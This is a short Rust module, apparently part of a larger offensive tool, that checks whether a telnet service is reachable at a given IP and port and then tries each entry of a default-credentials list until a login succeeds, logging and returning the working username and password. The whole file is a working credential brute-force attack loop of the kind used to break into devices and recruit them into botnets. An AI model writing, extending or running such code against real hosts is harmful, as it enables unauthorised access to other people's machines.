use super::credentials;
use super::scanner;
use super::transport;
use log::info;

pub async fn run(ip: &str, port: u16) -> Option<(String, String)> {
    // 1. Lightweight Scan (Is it even worth trying?)
    if !scanner::check_service(ip, port).await {
        return None;
    }

    // 2. Full Attack Loop
    for (user, pass) in credentials::DEFAULT_CREDS {
        if transport::try_telnet_login(ip, port, user, pass).await {
            info!("+ [Brute] SUCCESS: {}:{} -> {}:{}", ip, port, user, pass);
            return Some((user.to_string(), pass.to_string()));
        }
    }
    
    None
}
